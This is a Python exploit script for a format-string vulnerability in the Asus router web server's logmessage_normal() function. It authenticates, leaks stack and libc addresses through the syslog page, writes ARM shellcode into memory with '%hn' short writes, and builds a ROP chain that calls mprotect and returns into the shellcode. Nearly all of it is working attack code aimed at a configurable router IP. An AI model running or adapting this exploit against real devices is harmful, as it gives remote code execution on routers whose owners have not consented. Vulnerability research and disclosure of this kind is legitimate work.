#!/usr/bin/python3
import requests
import re
import struct
import sys
from textwrap import wrap
import base64
from time import sleep


# CVE-2022-XXXXX (CVE TBD)
# Uncontrolled Format String in httpd:logmessage_normal()
#
# The "logmessage_normal()" function in Asus httpd is vulnerable to format string attacks, it's possible to leverage the '%hn' short write format string specifier
# to write arbitrary bytes to controllable locations in memory. Thanks to a memory leak vulnerability within the device's syslog view (caused by the format string issue),
# it is possible to leak memory addresses, including the payload's location on the stack and a memory location within libc. Using this leak, it is possible to 
# consistently calculate arbitrary locations in memory to obtain a write-what-where primitive, eventually leading to remote code execution.
#
# For more information, visit: 
#   https://localh0st.run

# Change variables:
#   target
#   auth

client = requests.Session()
proxy = {"http":"http://127.0.0.1:8080"}

hdrs = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Referer":"http://TARGET/Main_Login.asp"
}

target = "http://192.168.1.200/apps_test.asp"
shellcode =  b"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x10\x30\xff\x21\xff\x31\x01\x31\x08\x27\x01\xdf\x40\x40\x01\x27\x01\xdf\x2f\x72\x6f\x6f\x74\x2f\x70\x77\x6e\x65\x64"

def login():
    auth = b"USER:PASSWORD"
    auth64 = base64.b64encode(auth)
    login = "http://192.168.1.200/login.cgi"
    login_body = {
        "group_id":"",
        "action_mode":"",
        "action_script":"",
        "action_wait":"5",
        "current_page":"Main_Login.asp",
        "next_page":"",
        "login_authorization": str(auth64, "utf-8"),
        "login_captcha":""
    }
    response = client.post(login, headers=hdrs, data=login_body)
    if "index.asp" in response.text:
        print("[*] Authenticated :)")
        return client
    else:
        print("[!] Authentication failed :(")
        return -1

# This stage makes a request with lots of '%p' and leaks the
# memory address of the actual payload's location on the stack, rad!
#
# It then calculates the logmessage_normal() return we'll eventually
# overwrite and does some math to get some empty stack memory to target
def leakMemory():
    payloads = [
        "QQQ%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
        "AAA %29$p"
        ]
    leak_payload = {
        "apps_action":"install",
        "apps_name":"",
        "apps_flag":"A "
    }

    for payload in payloads:
        leak_payload["apps_name"] = payload
        response = client.post(target, headers=hdrs, data=leak_payload)

    return parseSyslog()


def parseSyslog():
    response = client.get("http://192.168.1.200/ajax_log_data.asp", headers=hdrs)

    print("[*] Searching syslog for addresses...")
    # First, get the PID, need to know this for the right initial padding
    r = re.search("httpd (\d+)?:", response.text)
    pid = r.group(0)[6:].strip(':')

    # Get payload's stack address and the address to libc
    r = re.search("0x([0-9]+|[a-f])+\(nil\)\(nil", response.text)
    stackAddress = r.group(0)[0:10]
    r = re.search("AAA 0x\w+", response.text)
    libcAddress = int(r.group(0)[4:14],16) - 400158
    targetReturn = int(stackAddress, 16) - 100

    # Target buffer is way down the stack, as the stack gets reallocated when sending requests
    # We juuuust sneak by the reallocations at about payloadAddress + 0x3100-- fortunately there
    # are two gadgets that let us stack adjust 0x328c bytes
    # The stack address is just a few bytes off from $sp, so we adjust for by targetting +0x3254
    targetBuffer = int(stackAddress, 16) + 0x3254
    print("[*] Addresses found:\n\t-> %s : payload stack address\n\t-> 0x%x : libc (calculated)\n\t-> 0x%x : logmessage_normal() return (calculated)\n\t-> 0x%x : target buffer (calculated)" % (stackAddress, libcAddress, targetReturn, targetBuffer))

    return stackAddress,targetReturn,targetBuffer,libcAddress,pid

# writeMemory writes the payload to the location it calculated in leakMemory
# We can only write about 8 bytes in each request, so we use the split shellcode 
# and make (shellcodeSplit / 8) requests. It's ugly, but it works.
def writeMemory(targetBuffer, targetRetAddress, pid, sc_padded, ret_padded, nullOffset):

    # Padding needs to be adjusted based on the PID and current time, haven't put the current time check in though
    if len(pid) == 3:
        pad0 = b"A" * 5
    if len(pid) == 4:
        pad0 = b"A" * 4
    if len(pid) == 5:
        pad0 = b"A" * 3

    junk = b"JJJJ"
    data = b"AAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p"

    # Couple test payloads here to write 0x41414141 0x41414141 and base values
    #payload_testing = pad0 + struct.pack('L', targetBuffer) + junk + struct.pack('L', targetBuffer+0x2) + junk + struct.pack('L', targetBuffer+0x4) + junk + struct.pack('L', targetBuffer+0x6) + junk + data + b"%p" + b"%p" + b"%p" + b"%p" + b"%p" + b"%p" + b"%p" + b"%p"    
    #payload_testing = pad0 + struct.pack('L', targetBuffer) + junk + struct.pack('L', targetBuffer+0x2) + junk + struct.pack('L', targetBuffer+0x4) + junk + struct.pack('L', targetBuffer+0x6) + junk + data + b"%16507p" + b"%hn" + b"%257p" + b"%hn" + b"%65279p" + b"%hn" + b"%257p" + b"%hn"
    #payload_testing = pad0 + struct.pack('L', targetBuffer) + junk + struct.pack('L', targetBuffer+0x2) + junk + struct.pack('L', targetBuffer+0x4) + junk + struct.pack('L', targetBuffer+0x6) + junk + data + b"%p" + b"%hn" + b"%p" + b"%hn" + b"%p" + b"%hn" + b"%p" + b"%hn"

    print("[*] Payload will be sent over %d requests" % len(sc_padded))

    # Construct the payloads
    offset = 0x0
    payloads = []
    for bytes in sc_padded:
        if len(bytes) < 4:
            payloads.append(pad0 + struct.pack('L', targetBuffer + offset) + junk + struct.pack('L', targetBuffer + offset + 0x2) + junk + struct.pack('L', targetBuffer + offset + 0x4) + junk + struct.pack('L', targetBuffer + offset + 0x6) + junk + data + b"%" + str(bytes[0]).encode("ascii") + b"p" + b"%hn" + b"%" + str(bytes[1]).encode("ascii") + b"p" + b"%hn" + b"%" + str(bytes[2]).encode("ascii") + b"p" + b"%hn" + b"%65536p" + b"%hn")
        else:
            payloads.append(pad0 + struct.pack('L', targetBuffer + offset) + junk + struct.pack('L', targetBuffer + offset + 0x2) + junk + struct.pack('L', targetBuffer + offset + 0x4) + junk + struct.pack('L', targetBuffer + offset + 0x6) + junk + data + b"%" + str(bytes[0]).encode("ascii") + b"p" + b"%hn" + b"%" + str(bytes[1]).encode("ascii") + b"p" + b"%hn" + b"%" + str(bytes[2]).encode("ascii") + b"p" + b"%hn" + b"%" + str(bytes[3]).encode("ascii") + b"p" + b"%hn")
            # Shellcode testing payloads
            #payloads.append(pad0 + struct.pack('L', targetBuffer + offset) + junk + struct.pack('L', targetBuffer + offset + 0x2) + junk + struct.pack('L', targetBuffer + offset + 0x4) + junk + struct.pack('L', targetBuffer + offset + 0x6) + junk + data + b"%p" + b"%hn" + b"%p" + b"%hn" + b"%p" + b"%hn" + b"%p" + b"%hn")

        if offset == 0:
            if nullOffset:
                offset += 0x44
            else:
                offset += 0x08
        else:
            offset += 0x08

    # Send em
    c = 1
    for payload in payloads:
        print("[+] Payload: " + str(payload))
        write_payload = {
            "apps_action": "install",
            "apps_name": payload,
            "apps_flag": "A "
        }
        response = client.post(target, headers=hdrs, data=write_payload)
        print("[+] Sent payload %d, sleeping 5..." % c)
        sleep(5)
        c += 1

    # The final write is to overwrite the return address, beginning the rop chain
    # The first gadget is:
    #   0x00036928: add sp, sp, #0x1000; pop {r4, r5, pc};
    # So it's necessary to write a second gdaget @ sp + 0x1008:
    #   0x00042ad4: add sp, sp, #0x28c; add sp, sp, #0x2000; pop {r4, r5, r6, r7, pc};
    # This effectively adds 0x2028 to sp, then passes execution to 0x2028 + 0x14
    # That's where the shellcode begins
    #
    # Example:
    # sp = 0xBEEB0C18
    # after gadget1 (+0x1000)
    # sp = 0xBEEB1C18
    # temp = sp - targetReturn = 0x1010
    # Add 8 to cover pop,pop
    payload_return = pad0 + struct.pack('L', targetRetAddress) + junk + struct.pack('L', targetRetAddress + 0x2) + junk + struct.pack('L', targetRetAddress + 0x1018) + junk + struct.pack('L', targetRetAddress + 0x101A) + junk + data + b"%" + str(ret_padded[0][0] + 1).encode("ascii") + b"p" + b"%hn" + b"%" + str(ret_padded[0][1]).encode("ascii") + b"p" + b"%hn" + b"%" + str(ret_padded[0][2]).encode("ascii") + b"p" + b"%hn" + b"%" + str(ret_padded[0][3]).encode("ascii") + b"p" + b"%hn"

    payload_return_test = pad0 + struct.pack('L', targetRetAddress) + junk + struct.pack('L', targetRetAddress+0x02) + junk + struct.pack('L', targetRetAddress + 0x04) + junk + struct.pack('L', targetRetAddress+0x06) + junk + data + b"%p" + b"%hn" + b"%p" + b"%hn" + b"%p" + b"%hn" + b"%p" + b"%hn"

    write_payload = {
        "apps_action": "install",
        "apps_name": payload_return,
        "apps_flag": "A "
    }

    print("[+] Shellcode written, beginning rop execution...")
    response = client.post(target, headers=hdrs, data=write_payload, proxies=proxy)

# Function to create the rop chain, because we are converting into format string
# padding bytes, we don't need to worry about null-bytes, score!
#
# This creates "two" chains, the first is for the final return address overwrite
# The second is the actual chain to exec mprotect and return into shellcode
def ropGen(addresses):

    rop1 = b""
    # Gadget 1:
    #   Overwrite return address, adjust stack
    #       0x00036928: add sp, sp, #0x1000; pop {r4, r5, pc};
    gadget1 = addresses[3] + 223528
    g1 = struct.pack('<I', gadget1)
    rop1 += g1

    # Gadget 2:
    #   Second stack adjustment
    #       0x00042ad4: add sp, sp, #0x28c; add sp, sp, #0x2000; pop {r4, r5, r6, r7, pc};
    gadget2 = addresses[3] + 273108
    g2 = struct.pack('<I', gadget2)
    rop1 += g2

    rop2 = b""
    # Gadget 3:
    #   mprotect setup and exec:
    #       0x00033e48: pop {r0, r1, r2, r3, r4, pc};
    # Gadget 4:
    #   jmp to shellcode:
    #       0x0005b028: pop {r1, pc};
    mprotect = addresses[3] + 92000 + 4 # Additional +4 bytes to avoid the mprotect prologue which sets lr
    targetBuffer = addresses[2]
    stackBaseAddress = addresses[2] - 134848
    gadget3 = addresses[3] + 212552
    gadget4 = addresses[3] + 372776

    # Need to make sure we're not gonna try to write to a null byte
    t1 = hex(targetBuffer)[8:10:]
    nullOffset = 0x100 - int(t1, 16)
    fullLen = len(shellcode) + 48
    avoidNull = 0
    if fullLen > nullOffset:
        # The target buffer is close to a null byte, we can try to add a stack adjustment here to avoid it
        # 0x00051024: add sp, sp, #0x34; pop {r4, r5, r6, r7, pc};
        stackAdjust = addresses[3] + 331812
        print("[*] Null bytes will be encountered when writing the payload-- doing some stack-fu!")
        avoidNull = 1
        rop2 += struct.pack('<I', stackAdjust)
        rop2 += b"\x00\x00\x00\x00"
        #rop2 += struct.pack('<I', targetBuffer + 0x45)

    # Stack setup for gadget3
    rop2 += b"\x00\x00\x00\x00"                 # Extraneous
    rop2 += struct.pack('<I', gadget3)          # Gadget 3: 0x00033e48: pop {r0, r1, r2, r3, r4, pc};
    rop2 += struct.pack('<I', stackBaseAddress) # r0 - Stack base location
    rop2 += b"\x00\x10\x02\x00"                 # r1 - size
    rop2 += struct.pack('<I', 7)                # r2 - rwx
    rop2 += b"\x00\x00\x00\x00"                 # r3 (extraneous)
    rop2 += b"\x00\x00\x00\x00"                 # r4 (extraneous)
    rop2 += struct.pack('<I', mprotect)         # mprotect
    rop2 += b"\x00\x00\x00\x00"                 # mprotect 0x40578788 <+40>:    pop     {r3, r4, r7, pc}
    rop2 += b"\x00\x00\x00\x00"                 # mprotect 0x40578788 <+40>:    pop     {r3, r4, r7, pc}
    rop2 += b"\x00\x00\x00\x00"                 # mprotect 0x40578788 <+40>:    pop     {r3, r4, r7, pc}
    rop2 += struct.pack('<I', targetBuffer + len(rop2) + 0x38)
    # Unnecessary gadgets
    #rop2 += struct.pack('<I', gadget4)          # Gadget 4: 0x0005b028: pop {r1, pc};
    #rop2 += b"\x10\x10\x10\x10"                 # r1 (extraneous)
    #rop2 += struct.pack('<I', targetBuffer + len(rop2) + 0x40)

    return rop1,rop2,nullOffset

# Takes shellcode, returns format string padding values
#
def paddingFigureOutter(shellcode):

    # First, pad the shellcode if necessary
    t = len(shellcode) % 8
    if t != 0:
        shellcode += b"\x90" * (8 - t)

    # This is kind of annoying, but it needs to happen, we need to convert \x41\x41 into 0x4141
    # meaning, two individual 0x41 bytes are made to equal 0x4141, 16705 decimal
    shellcode_converted = ""
    # So, break up shellcode into individual bytes
    t = [shellcode[i:i+1] for i in range(0, len(shellcode), 1)]
    # Iterate through the resulting list to convert everything into hex strings
    for byte in t:
        # Trim the b'' from the byte
        bytes_trimmed = repr(byte)[2:-1]

        # Trim the b'\x' off bytes
        if len(bytes_trimmed) > 1:
            # Trim the \x from bytes that are len 4, e.g. \x90
            byte_trimmed2 = repr(bytes_trimmed)[4:-1]
            # For some reason these calculations break on encountering a backslash
            # This... "fixes" that... I guess
            if byte_trimmed2 == '\\':
                shellcode_converted += "5c"
            else:
                shellcode_converted += byte_trimmed2
        # Some bytes are single characters, need to convert these back to their hex values
        else:
            char_to_byte = "{:02x}".format(ord(bytes_trimmed))
            shellcode_converted += char_to_byte

    shellcode_fixed = ""
    # Split the shellcode into groups of 4 char
    split = wrap(shellcode_converted, 4)

    sc_words = []
    sc_pad_bytes = []
    c = 0
    # Reverse the order of the groups as we have to write backwards
    for value in split:
        t1 = value[0:2:]
        t2 = value[2::]
        value_reversed = t2 + t1
        sc_words.append(f"{int(value_reversed, 16):#06x}")

    # Shellcode is now split into words, we can write four words at a time
    # Call padCalc with the offset for each set of words
    reps = len(sc_words) / 4
    c = 0
    offset = 0

    # For some reason the second payload always has a base of one less, maybe something to do with ARMTHUMB? Donno
    while c < reps:
        if c == 1:
            sc_pad_bytes.append(padCalc(sc_words, offset, 0xce))
        else:
            sc_pad_bytes.append(padCalc(sc_words, offset, 0xcf))
        offset += 4
        c += 1

    # Debugging
    #print("[*] Shellcode converted to padding bytes: \n" + str(sc_pad_bytes) + "\n")

    return sc_pad_bytes

# Padding calculator, duh
# Takes the list of shellcode words and an offset (multiple of 4), returns the corresponding padding bytes
# a work of arT
# Here's the formula:
#
# Value you want - what's written so far
# 0x4141 - 0x00cf = 0x4072 (16498)
#
# Sometimes that results in a negative, ya gotta account for that
#
def padCalc(sc_words, offset, base):

    # temp vars
    t = []
    pad_bytes = []
    o = offset
    # build a new list of the four bytes we are math'ing
    while o < (offset + 4) and o < len(sc_words):
        t.append(sc_words[o])
        o += 1

    bw = 0
    p = 0

    for word in t:
        if p == 0:
            b = int(word, 16) - int(base) + 10
            if b < 0:
                b += 65536
            pad_bytes.append(b)
            bw = int(word, 16)
            p += 1
        else:
            b = int(word, 16) - int(bw)
            while b <= 0:
                b += 65536
            if len(str(b)) < 4:
                b += 65536
            pad_bytes.append(b)

            bw += b
    return pad_bytes

def main():
    if len(sys.argv) < 2:
        print("[!] Usage: ./exploit.py TARGET-IP")
        sys.exit(-1)

    loggedIn = login()
    if loggedIn != -1:
        try:
            addresses = leakMemory()
            rop = ropGen(addresses)
            sc = rop[1] + shellcode
            #print(str(sc))
            sc_padded = paddingFigureOutter(sc)
            #print(sc_padded)
            ret_padded = paddingFigureOutter(rop[0])
            writeMemory(addresses[2], addresses[1], addresses[4], sc_padded, ret_padded, rop[2])
        except Exception as e:
            raise

if __name__ == "__main__":
    main()
